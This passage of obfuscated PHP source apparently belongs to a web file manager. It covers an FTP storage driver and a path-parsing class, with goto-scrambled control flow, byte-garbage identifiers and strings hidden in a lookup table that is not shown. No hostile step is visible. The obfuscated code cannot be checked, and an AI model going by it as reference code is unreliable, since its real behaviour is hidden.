$BÎœ·™’­)) { return $this->getPathOuter($BÎœ·™’­); } if (!$this->mkdir($this->pathFather($BÎœ·™’­))) { return !1; } if ($BÎœ·™’­ = @ftp_mkdir($this->connect, $BÎœ·™’­)) { return $this->getPathOuter($BÎœ·™’­); } return !1; } public function copyFile($fŠ¾Ä, $d´ÄÅÓ»“) { goto fÊÑ–‡¯ÚÂ; BÜ„³¦ˆá: $dÕÉ²óÕÜÃ = $this->iconvApp($d¼©Ç—ÏÍ£); $this->download($fŠ¾Ä, $dÕÉ²óÕÜÃ); $aÏŒë¸âŸ = $this->upload($d´ÄÅÓ»“, $dÕÉ²óÕÜÃ); goto bîÁèìá•; bîÁèìá•: $this->tempFileRemve($d¼©Ç—ÏÍ£); return $aÏŒë¸âŸ; goto f‰¿íÁ¯³; fÊÑ–‡¯ÚÂ: if (!$this->_isconn()) { return !1; } $A‰îµŠ„‡ = $this->pathThis($this->iconvSystem($fŠ¾Ä)); $d¼©Ç—ÏÍ£ = $this->tempFile($A‰îµŠ„‡); goto BÜ„³¦ˆá; f‰¿íÁ¯³: } public function moveFile($dŒá Ş¡‹É, $c•„Ÿ´¸Š) { if (!$this->_isconn()) { return !1; } $dŒá Ş¡‹É = $this->iconvSystem($dŒá Ş¡‹É); $c•„Ÿ´¸Š = $this->iconvSystem($c•„Ÿ´¸Š); $b¹Ì·ÈÍƒõ = @ftp_rename($this->connect, $dŒá Ş¡‹É, $c•„Ÿ´¸Š); return $b¹Ì·ÈÍƒõ ? $this->getPathOuter($c•„Ÿ´¸Š) : !1; } public function delFile($aÆŠÛÆ·¸) { if (!$this->_isconn()) { return !1; } $aÆŠÛÆ·¸ = $this->iconvSystem($aÆŠÛÆ·¸); return @ftp_delete($this->connect, $aÆŠÛÆ·¸); } public function delFolder($FÏ“ÑÛñëÓ) { if (!$this->_isconn()) { return !1; } $FÏ“ÑÛñëÓ = $this->iconvSystem($FÏ“ÑÛñëÓ); $BİëÒŠ¡èœ = $this->ftpList($FÏ“ÑÛñëÓ); if (!$BİëÒŠ¡èœ) { return @ftp_rmdir($this->connect, $FÏ“ÑÛñëÓ); } foreach ($BİëÒŠ¡èœ as $Bø½Ø½ä) { if ($this->isFolder($Bø½Ø½ä)) { $Bø½Ø½ä = $this->iconvApp($Bø½Ø½ä); $this->delFolder($Bø½Ø½ä); } else { @ftp_delete($this->connect, $Bø½Ø½ä); } } return @ftp_rmdir($this->connect, $FÏ“ÑÛñëÓ); } public function rename($cë××©ä·», $d§ñ†Âåš) { goto c°»‡ÒÇ“; A¸—Êá»‚: $f¡Åõ‘ñâÇ = $this->iconvSystem($f¡Åõ‘ñâÇ); $cë××©ä·» = $this->iconvSystem($cë××©ä·»); $fÂ×ƒ©ÛªÑ = $this->pathFather($cë××©ä·»); goto c“‹ˆ«Ã®æ; c“‹ˆ«Ã®æ: $EİŸÓ±ÊóĞ = rtrim($fÂ×ƒ©ÛªÑ, $f§ù‰¶–©[8]) . $f§ù‰¶–©[8] . $f¡Åõ‘ñâÇ; $D°»ÚŒ¾Æ = @ftp_rename($this->connect, $cë××©ä·», $EİŸÓ±ÊóĞ); $EİŸÓ±ÊóĞ = $this->iconvApp($EİŸÓ±ÊóĞ); goto E¶‚§£¼Õ; E¶‚§£¼Õ: return $D°»ÚŒ¾Æ ? $this->getPathOuter($EİŸÓ±ÊóĞ) : !1; goto a‘Ëñïœãœ; c°»‡ÒÇ“: $f§ù‰¶–© =& $_SERVER[Õİõş]; if (!$this->_isconn()) { return !1; } $f¡Åõ‘ñâÇ = $this->fileNameAuto($this->pathFather($cë××©ä·»), $d§ñ†Âåš); goto A¸—Êá»‚; a‘Ëñïœãœ: } private function folderInfo($cçŒŸ•¥¬ì, $dø´Í­êµè = false) { goto E¢Ú¡ñ²…; cù¨ ğìê“: return $a®³º×‹; goto F„³Á ¸¥; b¹»ˆ†áÉº: $aÓôÀ¢¿Û = $this->iconvSystem($cçŒŸ•¥¬ì); if ($dø´Í­êµè) { return array($D”çˆÍ«Æ¦[28] => $Fó“ë÷¶‹, $D”çˆÍ«Æ¦[75] => $f”é·Îâ×„, $D”çˆÍ«Æ¦[29] => $D”çˆÍ«Æ¦[76]); } $a®³º×‹ = array($D”çˆÍ«Æ¦[28] => $Fó“ë÷¶‹, $D”çˆÍ«Æ¦[75] => $f”é·Îâ×„, $D”çˆÍ«Æ¦[29] => $D”çˆÍ«Æ¦[76], $D”çˆÍ«Æ¦[183] => 0, $D”çˆÍ«Æ¦[106] => 0, $D”çˆÍ«Æ¦[1157] => !0, $D”çˆÍ«Æ¦[1158] => !0); goto cù¨ ğìê“; E¢Ú¡ñ²…: $D”çˆÍ«Æ¦ =& $_SERVER[Õİõş]; $f”é·Îâ×„ = $this->getPathOuter(rtrim($cçŒŸ•¥¬ì, $D”çˆÍ«Æ¦[8])); $Fó“ë÷¶‹ = $this->pathThis($f”é·Îâ×„); goto b¹»ˆ†áÉº; F„³Á ¸¥: } private function fileInfo($D‡”Ê§–â±, $eºœåİËÈ¡ = false) { goto F­ˆ„µÔñ‚; bë¯î³æ§: $d°‚†ŒÏ[$DÜØ¹¤Û¬[106]] = $d°‚†ŒÏ[$DÜØ¹¤Û¬[106]] > 0 ? $d°‚†ŒÏ[$DÜØ¹¤Û¬[106]] : 0; return $d°‚†ŒÏ; goto cö×ğ¼¯ŸÁ; F­ˆ„µÔñ‚: $DÜØ¹¤Û¬ =& $_SERVER[Õİõş]; $eÀÉ“¨ìëÀ = $this->getPathOuter(rtrim($D‡”Ê§–â±, $DÜØ¹¤Û¬[8])); $dƒ¼Ö²¨ëÙ = $this->pathThis($eÀÉ“¨ìëÀ); goto cö·òà¥•; cö·òà¥•: $EÃÎ¸«õ„Š = $this->iconvSystem($D‡”Ê§–â±); if ($eºœåİËÈ¡) { return array($DÜØ¹¤Û¬[28] => $dƒ¼Ö²¨ëÙ, $DÜØ¹¤Û¬[75] => $eÀÉ“¨ìëÀ, $DÜØ¹¤Û¬[29] => $DÜØ¹¤Û¬[163], $DÜØ¹¤Û¬[156] => $this->ext($D‡”Ê§–â±), $DÜØ¹¤Û¬[77] => $this->size($D‡”Ê§–â±)); } $d°‚†ŒÏ = array($DÜØ¹¤Û¬[28] => $dƒ¼Ö²¨ëÙ, $DÜØ¹¤Û¬[75] => $eÀÉ“¨ìëÀ, $DÜØ¹¤Û¬[29] => $DÜØ¹¤Û¬[163], $DÜØ¹¤Û¬[183] => 0, $DÜØ¹¤Û¬[106] => @ftp_mdtm($this->connect, $EÃÎ¸«õ„Š), $DÜØ¹¤Û¬[156] => $this->ext($D‡”Ê§–â±), $DÜØ¹¤Û¬[77] => $this->size($D‡”Ê§–â±), $DÜØ¹¤Û¬[1157] => !0, $DÜØ¹¤Û¬[1158] => !0); goto bë¯î³æ§; cö×ğ¼¯ŸÁ: } public function size($fÊ±ß›¼—) { $fËÇ¨õ—Ò = $this->objectMeta($fÊ±ß›¼—); return $fËÇ¨õ—Ò ? $fËÇ¨õ—Ò[$_SERVER[Õİõş][77]] : 0; } public function info($D‡çİÑ¸ğ¥) { if ($this->isFile($D‡çİÑ¸ğ¥)) { return $this->fileInfo($D‡çİÑ¸ğ¥, 0); } else { if ($this->isFolder($D‡çİÑ¸ğ¥)) { return $this->folderInfo($D‡çİÑ¸ğ¥); } } return !1; } public function exist($F†æÎ×¹†·) { return $this->objectMeta($F†æÎ×¹†·) ? !0 : !1; } public function isFile($f®š‰ƒÑÛŠ) { $d´•÷™§– =& $_SERVER[Õİõş]; $e˜— íËùô = $this->objectMeta($f®š‰ƒÑÛŠ); return $e˜— íËùô ? $e˜— íËùô[$d´•÷™§–[29]] == $d´•÷™§–[163] : !1; } public function isFolder($dææ½ğĞ±µ) { $bæ‚³µ¿õ× =& $_SERVER[Õİõş]; $B¾ßÉŸÕÑ´ = $this->objectMeta($dææ½ğĞ±µ); return $B¾ßÉŸÕÑ´ ? $B¾ßÉŸÕÑ´[$bæ‚³µ¿õ×[29]] == $bæ‚³µ¿õ×[76] : !1; } public function listPath($a•›É§¥£, $FÕÇ‘¹ÂÇĞ = false) { goto E–»Ì½ÌŸ÷; E–»Ì½ÌŸ÷: $FØƒµÁ‡óœ =& $_SERVER[Õİõş]; if (!$this->_isconn()) { return !1; } $a•›É§¥£ = $this->iconvSystem($a•›É§¥£); goto f¨ŠõÎ…‰; f¨ŠõÎ…‰: $a†ë„Ô‰äå = $this->ftpList($a•›É§¥£); $c£ğ‹Û‰±« = array($FØƒµÁ‡óœ[74] => array(), $FØƒµÁ‡óœ[73] => array()); if (!$a†ë„Ô‰äå) { return $c£ğ‹Û‰±«; } goto f¥ éî¬Ò; f¥ éî¬Ò: foreach ($a†ë„Ô‰äå as $a•›É§¥£) { if ($this->isFolder($a•›É§¥£)) { $c£ğ‹Û‰±«[$FØƒµÁ‡óœ[74]][] = $this->folderInfo($a•›É§¥£, $FÕÇ‘¹ÂÇĞ); } else { $c£ğ‹Û‰±«[$FØƒµÁ‡óœ[73]][] = $this->fileInfo($a•›É§¥£, $FÕÇ‘¹ÂÇĞ); } } return $c£ğ‹Û‰±«; goto Cî±ùíô¹Ø; Cî±ùíô¹Ø: } public function has($f©·•›Ùå, $e›„Š®”×½ = false, $AÍøèæª ³ = true) { goto Fñî¾ÈÌƒÒ; Fñî¾ÈÌƒÒ: $Dğõ®¦†ê =& $_SERVER[Õİõş]; if (!$this->_isconn()) { return !1; } $f©·•›Ùå = $this->iconvSystem($f©·•›Ùå); goto eÑÌ¾ùô˜â; B¤Áğ˜øÓ¥: foreach ($cî…ó¯‘ñ as $f©·•›Ùå) { if ($AÍøèæª ³) { if (!$this->isFolder($f©·•›Ùå)) { return !0; } } else { if ($this->isFolder($f©·•›Ùå)) { return !0; } } } return !1; goto aöøÓÊóŒÉ; eÑÌ¾ùô˜â: $cî…ó¯‘ñ = $this->ftpList($f©·•›Ùå); if (!$cî…ó¯‘ñ) { return !1; } if ($e›„Š®”×½) { return array($Dğõ®¦†ê[187] => 0, $Dğõ®¦†ê[188] => count($cî…ó¯‘ñ)); } goto B¤Áğ˜øÓ¥; aöøÓÊóŒÉ: } public function listAll($Fìˆˆ¥•ÄĞ) { goto dÖÙô…£; EÜ¢ãË¹«©: foreach ($E¸ÌùÖƒëÛ[$B°õÏÊğêÓ[74]] as $e™Å¤‹£µï) { $Fæ¬Ÿ„„Â®[] = array($B°õÏÊğêÓ[75] => $B°õÏÊğêÓ[8] . trim(str_replace($Fìˆˆ¥•ÄĞ, $B°õÏÊğêÓ[33], $e™Å¤‹£µï), $B°õÏÊğêÓ[8]) . $B°õÏÊğêÓ[8], $B°õÏÊğêÓ[76] => 1, $B°õÏÊğêÓ[77] => 0); } foreach ($E¸ÌùÖƒëÛ[$B°õÏÊğêÓ[73]] as $cß¹Ïäë‚·) { $Fæ¬Ÿ„„Â®[] = array($B°õÏÊğêÓ[75] => $B°õÏÊğêÓ[8] . trim(str_replace($Fìˆˆ¥•ÄĞ, $B°õÏÊğêÓ[33], $cß¹Ïäë‚·), $B°õÏÊğêÓ[8]), $B°õÏÊğêÓ[76] => 0, $B°õÏÊğêÓ[77] => $this->size($cß¹Ïäë‚·)); } return $Fæ¬Ÿ„„Â®; goto FêÛğè­ˆ; dÖÙô…£: $B°õÏÊğêÓ =& $_SERVER[Õİõş]; if (!$this->_isconn()) { return !1; } $Fìˆˆ¥•ÄĞ = $this->iconvSystem($Fìˆˆ¥•ÄĞ); goto E¸„Î÷ùø‹; E¸„Î÷ùø‹: $E¸ÌùÖƒëÛ = array($B°õÏÊğêÓ[73] => array(), $B°õÏÊğêÓ[74] => array()); $this->recursionFtpFiles($Fìˆˆ¥•ÄĞ, $E¸ÌùÖƒëÛ); $Fæ¬Ÿ„„Â® = array(); goto EÜ¢ãË¹«©; FêÛğè­ˆ: } public function getContent($d¦†¶ºá†”) { if (!$this->_isconn()) { return !1; } $d¦†¶ºá†” = $this->iconvSystem($d¦†¶ºá†”); return $this->fileSubstr($d¦†¶ºá†”); } public function setContent($aİ¢àŞŸĞ, $b„”òåö’ = '') { goto dŞ­È·¸Ò; f¸×ë†„: return $bÚó¬ØÎŒ; goto c–ÁÖ†ŞÛã; dŞ­È·¸Ò: if (!$this->_isconn()) { return !1; } $b—í» ‡Õœ = $this->pathThis($this->iconvSystem($aİ¢àŞŸĞ)); $b³ÈÀÒ¢Ş• = $this->tempFile($b—í» ‡Õœ); goto c·‡‚›‰âŠ; c·‡‚›‰âŠ: file_put_contents($b³ÈÀÒ¢Ş•, $b„”òåö’); $bÚó¬ØÎŒ = $this->upload($aİ¢àŞŸĞ, $this->iconvApp($b³ÈÀÒ¢Ş•)); $this->tempFileRemve($b³ÈÀÒ¢Ş•); goto f¸×ë†„; c–ÁÖ†ŞÛã: } public function fileSubstr($fÊ†…²ŸéÛ, $BÔğŒçÕÓÓ = 0, $c³µæÑ¨ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($fÊ†…²ŸéÛ, $BÔğŒçÕÓÓ, $c³µæÑ¨); } private function ftpRequest($eæ¤×öÓ¹‡, $DÔ¾ÒâÒ„´ = 0, $e¤·ºåˆÈÌ = false) { goto dëÄ‘÷ŠùÌ; dòÈËŞ¿†¨: return $C‘µÉ—Ü; goto F»·æÉˆÔ; dëÄ‘÷ŠùÌ: $eæ¤×öÓ¹‡ = $this->iconvSystem($eæ¤×öÓ¹‡); $CÙ­¼ƒàˆ¾ = $this->scheme . $this->host . $_SERVER[Õİõş][4] . $this->port; $aåº°½ĞõÖ = curl_init(); goto eÒ‘“ˆä; f•ëùìê: curl_setopt($aåº°½ĞõÖ, CURLOPT_RETURNTRANSFER, 1); $C‘µÉ—Ü = curl_exec($aåº°½ĞõÖ); curl_close($aåº°½ĞõÖ); goto dòÈËŞ¿†¨; eÒ‘“ˆä: curl_setopt($aåº°½ĞõÖ, CURLOPT_URL, $CÙ­¼ƒàˆ¾ . $this->pathEncode($eæ¤×öÓ¹‡)); curl_setopt($aåº°½ĞõÖ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($e¤·ºåˆÈÌ) { $CÂÛÍõ´£Æ = $DÔ¾ÒâÒ„´ + $e¤·ºåˆÈÌ - 1; curl_setopt($aåº°½ĞõÖ, CURLOPT_RANGE, "{$DÔ¾ÒâÒ„´}\55{$CÂÛÍõ´£Æ}"); } goto f•ëùìê; F»·æÉˆÔ: } public function upload($BÅÆ‡×ø”, $E„ªåîšÊ, $bÆ¾Ó§İ±ù = false, $Dæ¹‹ĞµÓ = REPEAT_REPLACE) { goto fœ¶ã™³”; E«ŸàÕ‘²õ: $E„ªåîšÊ = $this->iconvSystem($E„ªåîšÊ); $c°®ÑÓ®î‰ = ftp_nb_put($this->connect, $BÅÆ‡×ø”, $E„ªåîšÊ, FTP_BINARY); while ($c°®ÑÓ®î‰ == FTP_MOREDATA) { $c°®ÑÓ®î‰ = ftp_nb_continue($this->connect); } goto bİÍÛœ¯; fœ¶ã™³”: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($BÅÆ‡×ø”))) { return !1; } $BÅÆ‡×ø” = $this->iconvSystem($BÅÆ‡×ø”); goto E«ŸàÕ‘²õ; bİÍÛœ¯: if ($c°®ÑÓ®î‰ != FTP_FINISHED) { return !1; } return $this->getPathOuter($BÅÆ‡×ø”); goto D†Èœ÷¸Ë; D†Èœ÷¸Ë: } public function download($Bßç¶øŞ—, $dêïî˜™ = '') { goto E°Ë®ò„½ò; f¦ÙìïÓ­ë: while ($b®Ù‘Ş÷Õ× == FTP_MOREDATA) { $b®Ù‘Ş÷Õ× = ftp_nb_continue($this->connect); } if ($b®Ù‘Ş÷Õ× != FTP_FINISHED) { return !1; } return $this->iconvApp($dêïî˜™); goto F‡¶­Œº£; E°Ë®ò„½ò: if (!$this->_isconn()) { return !1; } $f¾ª‹Ğ‰Åø = $this->pathFather($dêïî˜™); if (!IO::mkdir($f¾ª‹Ğ‰Åø)) { return !1; } goto aÅ—ÀÕÆŒ; aÅ—ÀÕÆŒ: $Bßç¶øŞ— = $this->iconvSystem($Bßç¶øŞ—); $dêïî˜™ = $this->iconvSystem($dêïî˜™); $b®Ù‘Ş÷Õ× = ftp_nb_get($this->connect, $dêïî˜™, $Bßç¶øŞ—, FTP_BINARY); goto f¦ÙìïÓ­ë; F‡¶­Œº£: } private function ftpList($f¥¯ÁäîÚÜ) { goto Fù¤‚‡¼ªÁ; Fù¤‚‡¼ªÁ: $e»‹ÆÑƒ¬Ö =& $_SERVER[Õİõş]; if (!$this->isFolder($f¥¯ÁäîÚÜ)) { return !1; } @ftp_chdir($this->connect, $e»‹ÆÑƒ¬Ö[8]); goto DĞÖìùÎœÔ; DĞÖìùÎœÔ: $f¥¯ÁäîÚÜ = rtrim($f¥¯ÁäîÚÜ, $e»‹ÆÑƒ¬Ö[8]) . $e»‹ÆÑƒ¬Ö[8]; $d¼¹˜¦çÔ = @ftp_nlist($this->connect, $f¥¯ÁäîÚÜ); if ($d¼¹˜¦çÔ === !1) { $d¼¹˜¦çÔ = @ftp_rawlist($this->connect, $f¥¯ÁäîÚÜ); foreach ($d¼¹˜¦çÔ as $dÜ…®Ï‰” => $aˆÓˆ‡ø–Æ) { $d¼¹˜¦çÔ[$dÜ…®Ï‰”] = end(explode($e»‹ÆÑƒ¬Ö[1159], $aˆÓˆ‡ø–Æ)); } } goto C£Ò•ˆæ‰›; C£Ò•ˆæ‰›: $BôŸë«îÁ‹ = array(); foreach ($d¼¹˜¦çÔ as $A½Êí« ·) { if ($A½Êí« · == $e»‹ÆÑƒ¬Ö[91] || $A½Êí« · == $e»‹ÆÑƒ¬Ö[1160]) { continue; } if (!strstr($A½Êí« ·, $e»‹ÆÑƒ¬Ö[8])) { $A½Êí« · = $f¥¯ÁäîÚÜ . ltrim($A½Êí« ·, $e»‹ÆÑƒ¬Ö[8]); } $BôŸë«îÁ‹[] = $this->iconvApp($A½Êí« ·); } return $BôŸë«îÁ‹; goto EÏ ºëÍ“İ; EÏ ºëÍ“İ: } private function recursionFtpFiles($e ±¢ƒÁß, &$b—ÁçäŞĞ) { $c¸„£©†¥ì =& $_SERVER[Õİõş]; if (!$this->_isconn()) { return !1; } if (!($E¥›„–Ç¾Â = $this->ftpList($e ±¢ƒÁß))) { return !1; } foreach ($E¥›„–Ç¾Â as $e ±¢ƒÁß) { if ($this->isFolder($e ±¢ƒÁß)) { $this->recursionFtpFiles($e ±¢ƒÁß, $b—ÁçäŞĞ); $b—ÁçäŞĞ[$c¸„£©†¥ì[74]][] = $e ±¢ƒÁß; } else { $b—ÁçäŞĞ[$c¸„£©†¥ì[73]][] = $e ±¢ƒÁß; } } } private function objectMeta($B§®‚™ÁÅğ) { goto aíƒ‡‡ÛÂİ; eÊíö™‘µŠ: if ($EŸ¡Â‚…æö !== null && $EŸ¡Â‚…æö !== !1) { return $EŸ¡Â‚…æö; } if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $EàÆ˜è§Èõ[8]); goto ešóœ†©Ó¸; ešóœ†©Ó¸: $D“²¡Ã´¼ = @ftp_size($this->connect, $this->iconvSystem($B§®‚™ÁÅğ)); if ($D“²¡Ã´¼ != -1) { $EŸ¡Â‚…æö = array($EàÆ˜è§Èõ[77] => $D“²¡Ã´¼, $EàÆ˜è§Èõ[29] => $EàÆ˜è§Èõ[163]); } else { $dãÜòÅà‡İ = @ftp_chdir($this->connect, $this->iconvSystem($B§®‚™ÁÅğ)); $EŸ¡Â‚…æö = $dãÜòÅà‡İ ? array($EàÆ˜è§Èõ[77] => 0, $EàÆ˜è§Èõ[29] => $EàÆ˜è§Èõ[76]) : !1; } Cache::set($DŞå†Î›ç, $EŸ¡Â‚…æö, 0); goto EÎ®ó’æ¦ï; EÎ®ó’æ¦ï: return $EŸ¡Â‚…æö; goto eÕ·¦¼÷½Ç; aíƒ‡‡ÛÂİ: $EàÆ˜è§Èõ =& $_SERVER[Õİõş]; $DŞå†Î›ç = $EàÆ˜è§Èõ[1161] . md5($B§®‚™ÁÅğ); $EŸ¡Â‚…æö = Cache::get($DŞå†Î›ç); goto eÊíö™‘µŠ; eÕ·¦¼÷½Ç: } } goto eé‘†ŞÉ¿; FÊÓ——¶¯œ: class KodIO { const KOD_SOURCE = "\173\163\157\x75\x72\x63\145\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\x52\x65\x63\x79\143\154\145\x7d"; const KOD_USER_FAV = "\173\x75\163\145\x72\x46\x61\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\163\145\x72\x46\151\154\x65\x54\x61\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\145\x72\106\151\154\145\x54\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\x52\x6f\x6f\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\x7b\165\163\145\x72\x53\x68\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\x65\162\123\x68\x61\x72\x65\114\x69\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\145\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\x68\x61\x72\145\x49\x74\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\163\150\141\x72\145\111\164\x65\155\114\151\156\153\x7d"; const KOD_SEARCH = "\x7b\x73\145\141\x72\x63\150\175"; const KOD_BLOCK = "\x7b\x62\x6c\157\x63\153\175"; const KOD_IO = "\173\151\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\x72\122\x65\156\x63\x65\x6e\x74\175"; const KOD_USER_DRIVER = "\173\x64\x72\151\166\x65\x72\x7d"; public static function typeList() { $A±¬Ì—‘ =& $_SERVER[Õİõş]; return array($A±¬Ì—‘[1053] => self::KOD_SOURCE, $A±¬Ì—‘[1054] => self::KOD_USER_RECYCLE, $A±¬Ì—‘[1055] => self::KOD_USER_FAV, $A±¬Ì—‘[1056] => self::KOD_USER_FILE_TAG, $A±¬Ì—‘[1057] => self::KOD_USER_FILE_TYPE, $A±¬Ì—‘[1058] => self::KOD_GROUP_ROOT_SELF, $A±¬Ì—‘[1059] => self::KOD_USER_SHARE, $A±¬Ì—‘[1060] => self::KOD_USER_SHARE_LINK, $A±¬Ì—‘[1061] => self::KOD_USER_SHARE_TO_ME, $A±¬Ì—‘[1062] => self::KOD_SHARE_ITEM, $A±¬Ì—‘[1063] => self::KOD_SHARE_LINK, $A±¬Ì—‘[1064] => self::KOD_SEARCH, $A±¬Ì—‘[1065] => self::KOD_BLOCK, $A±¬Ì—‘[1066] => self::KOD_IO, $A±¬Ì—‘[1067] => self::KOD_USER_RECENT, $A±¬Ì—‘[1068] => self::KOD_USER_DRIVER); } public static function parse($a‚¢½Ñ§›÷) { goto C„ï£›ƒÙ¨; C„ï£›ƒÙ¨: $B×ò½•¤•Ø =& $_SERVER[Õİõş]; $a‚¢½Ñ§›÷ = self::clear($a‚¢½Ñ§›÷); $BÖ½£ˆ‘ï¥ = array_values(self::typeList()); goto eÆ¶•™; d³øÌ¯®Ï: $b¤Ş‘ø‹Ö = array($B×ò½•¤•Ø[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $EÒ°ˆï¬[$B×ò½•¤•Ø[1073]] = in_array($EÒ°ˆï¬[$B×ò½•¤•Ø[29]], $b¤Ş‘ø‹Ö); return $EÒ°ˆï¬; goto c”¹Ù¢çîî; eÆ¶•™: preg_match($B×ò½•¤•Ø[1069], $a‚¢½Ñ§›÷, $F×¯Œ¯ªõ©); $EÒ°ˆï¬ = array($B×ò½•¤•Ø[384] => !1, $B×ò½•¤•Ø[1070] => !1, $B×ò½•¤•Ø[381] => !1, $B×ò½•¤•Ø[75] => $a‚¢½Ñ§›÷, $B×ò½•¤•Ø[1014] => !1, $B×ò½•¤•Ø[1013] => $B×ò½•¤•Ø[33]); if (is_array($F×¯Œ¯ªõ©) && count($F×¯Œ¯ªõ©) == 5) { $BæŞ‘ÁãÔ = $B×ò½•¤•Ø[1071] . $F×¯Œ¯ªõ©[2] . $B×ò½•¤•Ø[311]; if (in_array($BæŞ‘ÁãÔ, $BÖ½£ˆ‘ï¥)) { $EÒ°ˆï¬[$B×ò½•¤•Ø[1014]] = $F×¯Œ¯ªõ©[1]; $EÒ°ˆï¬[$B×ò½•¤•Ø[29]] = $BæŞ‘ÁãÔ; $EÒ°ˆï¬[$B×ò½•¤•Ø[1072]] = substr($BæŞ‘ÁãÔ, 1, -1); $EÒ°ˆï¬[$B×ò½•¤•Ø[363]] = $F×¯Œ¯ªõ©[3]; } $EÒ°ˆï¬[$B×ò½•¤•Ø[1013]] = $F×¯Œ¯ªõ©[4]; } goto d³øÌ¯®Ï; c”¹Ù¢çîî: } public static function clear($C–£˜¼·ª½) { goto BÉ£ª‰µé†; f°™‰Õìè†: if ($C–£˜¼·ª½ == $a˜‹‡ÂÚŠã[8]) { return $a˜‹‡ÂÚŠã[8]; } $C–£˜¼·ª½ = rtrim($C–£˜¼·ª½, $a˜‹‡ÂÚŠã[8]); return $C–£˜¼·ª½; goto B×“Û‘±ÃÔ; BÉ£ª‰µé†: $a˜‹‡ÂÚŠã =& $_SERVER[Õİõş]; $C–£˜¼·ª½ = str_replace($a˜‹‡ÂÚŠã[93], $a˜‹‡ÂÚŠã[8], $C–£˜¼·ª½); $E¢ïŸñÆ‡¡ = $a˜‹‡ÂÚŠã[1074]; goto EÊ›ªÈ‘…Î; EÊ›ªÈ‘…Î: if (substr($C–£˜¼·ª½, 0, 3) == $a˜‹‡ÂÚŠã[1075]) { $C–£˜¼·ª½ = substr($C–£˜¼·ª½, 3); } while (strstr($C–£˜¼·ª½, $E¢ïŸñÆ‡¡)) { $C–£˜¼·ª½ = str_replace($E¢ïŸñÆ‡¡, $a˜‹‡ÂÚŠã[8], $C–£˜¼·ª½); } $C–£˜¼·ª½ = preg_replace($a˜‹‡ÂÚŠã[1076], $a˜‹‡ÂÚŠã[8], $C–£˜¼·ª½); goto f°™‰Õìè†; B×“Û‘±ÃÔ: } public static function sourceID($CÈ„ª»ÜÕï) { $Bì ôÉÆîŒ =& $_SERVER[Õİõş]; $cŠïé–“… = self::parse($CÈ„ª»ÜÕï); if ($cŠïé–“…[$Bì ôÉÆîŒ[29]] !== self::KOD_SOURCE) { show_json(LNG($Bì ôÉÆîŒ[1077]), !1); } return $cŠïé–“…[$Bì ôÉÆîŒ[363]]; } public static function make($eµ‘ëì½ßˆ) { if (!$eµ‘ëì½ßˆ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($eµ‘ëì½ßˆ)); } public static function makeShare($E¨Ë’ŸåîÏ, $d‹ğ’¦ê’Ç) { return self::makePath(self::KOD_SHARE_ITEM, $E¨Ë’ŸåîÏ, $d‹ğ’¦ê’Ç); } public static function makeFileTypePath($E¿Ğä¥…ß˜) { return self::makePath(self::KOD_USER_FILE_TYPE, $E¿Ğä¥…ß˜); } public static function makeFileTagPath($AìàÇª”) { return self::makePath(self::KOD_USER_FILE_TAG, $AìàÇª”); } public static function makePath($f‘ÓÅÇ÷, $d‰¯ÔÄğ¯ï = '', $BÃæ¢í‚—Ò = '') { $D“À÷ñ²é =& $_SERVER[Õİõş]; $A©õ‰Œ½µ÷ = substr($f‘ÓÅÇ÷, 1, -1); $C×Š«Ï©• = $D“À÷ñ²é[1078] . $A©õ‰Œ½µ÷ . $D“À÷ñ²é[1079] . $d‰¯ÔÄğ¯ï . $D“À÷ñ²é[1080]; $C×Š«Ï©• = $BÃæ¢í‚—Ò ? $C×Š«Ï©• . $BÃæ¢í‚—Ò . $D“À÷ñ²é[8] : $C×Š«Ï©•; return $C×Š«Ï©•; } public static function hashPath($bí¯ò¨¸Š) { $DØ¬ÎïáÏ´ =& $_SERVER[Õİõş]; $eóŒËÅ…¤Å = is_array($bí¯ò¨¸Š) ? $bí¯ò¨¸Š : IO::info($bí¯ò¨¸Š); $bá¤Ó‹ÕÙØ = _get($eóŒËÅ…¤Å, $DØ¬ÎïáÏ´[1081], $DØ¬ÎïáÏ´[33]); if (!$bá¤Ó‹ÕÙØ) { $Bë·ÅŸíÚ¬ = KodIO::parse($eóŒËÅ…¤Å[$DØ¬ÎïáÏ´[75]]); if (!$Bë·ÅŸíÚ¬[$DØ¬ÎïáÏ´[29]]) { $bá¤Ó‹ÕÙØ = IO::hashSimple($eóŒËÅ…¤Å[$DØ¬ÎïáÏ´[75]]); } } if (!$bá¤Ó‹ÕÙØ) { $bá¤Ó‹ÕÙØ = md5($eóŒËÅ…¤Å[$DØ¬ÎïáÏ´[75]] . $eóŒËÅ…¤Å[$DØ¬ÎïáÏ´[77]] . $eóŒËÅ…¤Å[$DØ¬ÎïáÏ´[106]]); } return $bá¤Ó‹ÕÙØ; } public static function initSystemPath() { $A“½Áğ Çç =& $_SERVER[Õİõş]; if (defined($A“½Áğ Çç[1082])) { return; } define($A“½Áğ Çç[1082], self::systemPath($A“½Áğ Çç[1083])); define($A“½Áğ Çç[1084], self::systemPath($A“½Áğ Çç[1085])); define($A“½Áğ Çç[1086], self::systemPath($A“½Áğ Çç[1087])); define($A“½Áğ Çç[1088], self::systemPath($A“½Áğ Çç[1089])); } private static function systemPath($d„Õë³ŞÀ…) { goto DÖä…„¬Ö—; DÖä…„¬Ö—: $C’¯”¥’ƒØ =& $_SERVER[Õİõş]; $bªĞÁÇóÃ = $C’¯”¥’ƒØ[1090] . ucfirst($d„Õë³ŞÀ…); $Eá’Ë­¡· = Model($C’¯”¥’ƒØ[1091])->get($bªĞÁÇóÃ); goto CÊÄ—¾¹õ¿; E±‚µŒ¦“Ò: return 